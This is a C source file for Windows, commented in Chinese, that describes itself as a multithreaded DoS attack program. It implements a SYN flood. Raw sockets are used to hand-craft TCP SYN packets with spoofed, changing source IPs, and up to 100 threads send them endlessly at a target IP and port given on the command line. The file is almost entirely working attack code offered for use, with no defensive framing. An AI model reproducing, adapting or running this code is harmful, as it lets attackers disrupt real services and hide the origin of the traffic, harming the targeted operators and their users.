// 多线程dos攻击程序

#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")
#define SEQ 0x28376839
int threadnum, maxthread, port;
char *DestIP;//目标IP
void display(void)  // 定义状态提示函数
{
    static int play = 0;
    // 进度条
    char *plays[12] =
    {
        " | ",
        " / ",
        " - ",
        " \\ ",
        " | ",
        " / ",
        " - ",
        " \\ ",
        " | ",
        " / ",
        " - ",
        " \\ ",
    };

    printf("=%s= %d threads \r", plays[play], threadnum);
    play = (play == 11) ? 0 : play + 1;
}
//定义一个tcphdr结构来存放TCP首部
typedef struct tcphdr
{
    USHORT th_sport;//16位源端口号
    USHORT th_dport;//16位目的端口号
    unsigned int th_seq;//32位序列号
    unsigned int th_ack;//32位确认号
    unsigned char th_lenres;//4位首部长度+6位保留字中的4位
    unsigned char th_flag;////6位标志位
    USHORT th_win;//16位窗口大小
    USHORT th_sum;//16位效验和
    USHORT th_urp;//16位紧急数据偏移量
} TCP_HEADER;
//定义一个iphdr来存放IP首部
typedef struct iphdr//ip首部
{
    unsigned char h_verlen;//4位手部长度，和4位IP版本号
    unsigned char tos;//8位类型服务
    unsigned short total_len;//16位总长度
    unsigned short ident;//16位标志
    unsigned short frag_and_flags;//3位标志位（如SYN,ACK,等等)
    unsigned char ttl;//8位生存时间
    unsigned char proto;//8位协议
    unsigned short checksum;//ip手部效验和
    unsigned int sourceIP;//伪造IP地址
    unsigned int destIP;//攻击的ip地址
} IP_HEADER;

//TCP伪首部，用于进行TCP效验和的计算，保证TCP效验的有效性
struct
{
    unsigned long saddr;//源地址
    unsigned long daddr;//目的地址
    char mbz;//置空
    char ptcl;//协议类型
    unsigned short tcpl;//TCP长度
} PSD_HEADER;
//计算效验和函数，先把IP首部的效验和字段设为0(IP_HEADER.checksum=0)
//然后计算整个IP首部的二进制反码的和。
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum = 0;
    while(size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if(size) cksum += *(UCHAR *)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}
DWORD WINAPI SynfloodThread(LPVOID lp)//synflood线程函数
{
    SOCKET  sock = NULL;
    int ErrorCode = 0, flag = true, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
    struct sockaddr_in sockAddr;
    TCP_HEADER  tcpheader;
    IP_HEADER   ipheader;
    char        sendBuf[128];
    sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
    if(sock == INVALID_SOCKET)
    {
        printf("Socket failed: %d\n", WSAGetLastError());
        return 0;
    }
    //设置IP_HDRINCL以便自己填充IP首部
    ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
    if(ErrorCode == SOCKET_ERROR)
    {
        printf("Set sockopt failed: %d\n", WSAGetLastError());
        return 0;
    }
    //设置发送超时
    ErrorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char *)&TimeOut, sizeof(TimeOut));
    if(ErrorCode == SOCKET_ERROR)
    {
        printf("Set sockopt time out failed: %d\n", WSAGetLastError());
        return 0;
    }
    //设置目标地址
    memset(&sockAddr, 0, sizeof(sockAddr));
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_addr.s_addr = inet_addr(DestIP);
    FakeIpNet = inet_addr(DestIP);
    FakeIpHost = ntohl(FakeIpNet);
    //填充IP首部
    ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
    ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
    ipheader.ident = 1;
    ipheader.frag_and_flags = 0;
    ipheader.ttl = 128;
    ipheader.proto = IPPROTO_TCP;
    ipheader.checksum = 0;
    ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
    ipheader.destIP = inet_addr(DestIP);
    //填充TCP首部
    tcpheader.th_dport = htons(port);
    tcpheader.th_sport = htons(8080);
    tcpheader.th_seq = htonl(SEQ + SendSEQ);
    tcpheader.th_ack = 0;
    tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
    tcpheader.th_flag = 2;
    tcpheader.th_win = htons(16384);
    tcpheader.th_urp = 0;
    tcpheader.th_sum = 0;

    PSD_HEADER.saddr = ipheader.sourceIP;
    PSD_HEADER.daddr = ipheader.destIP;
    PSD_HEADER.mbz = 0;
    PSD_HEADER.ptcl = IPPROTO_TCP;
    PSD_HEADER.tcpl = htons(sizeof(tcpheader));
    for(;;)
    {
        SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
        ipheader.checksum = 0;
        ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
        tcpheader.th_seq = htonl(SEQ + SendSEQ);
        tcpheader.th_sport = htons(SendSEQ);
        tcpheader.th_sum = 0;
        PSD_HEADER.saddr = ipheader.sourceIP;

        //把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和
        memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
        memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
        tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
        memcpy(sendBuf, &ipheader, sizeof(ipheader));
        memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader));
        memset(sendBuf + sizeof(ipheader) + sizeof(tcpheader), 0, 4);
        dataSize = sizeof(ipheader) + sizeof(tcpheader);
        ipheader.checksum = checksum((USHORT *)sendBuf, dataSize);
        memcpy(sendBuf, &ipheader, sizeof(ipheader));
        sendto(sock, sendBuf, dataSize, 0, (struct sockaddr *) &sockAddr, sizeof(sockAddr));
        display();
    }//end for
    Sleep(20);
    InterlockedExchangeAdd((long *)&threadnum, -1);
    return 0;
}
void usage(char *name)
{
    printf("\t===================SYN Flood======================\n");
    printf("\t==========gxisone@hotmail.com     2004/7/6========\n");
    printf("\tusage: %s [dest_IP] [port] [thread]\n", name);
    printf("\tExample: %s 192.168.1.1 80 100\n", name);
}
int main(int argc, char *argv[])
{
    if(argc != 4)
    {
        usage(argv[0]);
        return 0;
    }
    usage(argv[1]);
    int ErrorCode = 0;
    DestIP = argv[1]; //取得目标主机IP
    port = atoi(argv[2]); //取得目标端口号
    maxthread = (maxthread > 100) ? 100 : atoi(argv[3]);
    //如果线程数大于100则把线程数设置为100
    WSADATA wsaData;
    if((ErrorCode = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
    {
        printf("WSAStartup failed: %d\n", ErrorCode);
        return 0;
    }
    printf("[start]...........\nPress any key to stop!\n");
    while(threadnum < maxthread) //循环创建线程
    {
        if(CreateThread(NULL, 0, SynfloodThread, 0, 0, 0))
        {
            Sleep(10);
            threadnum++;
        }
    }
    WSACleanup();
    printf("\n[Stopd]...........\n");
    return 0;
}
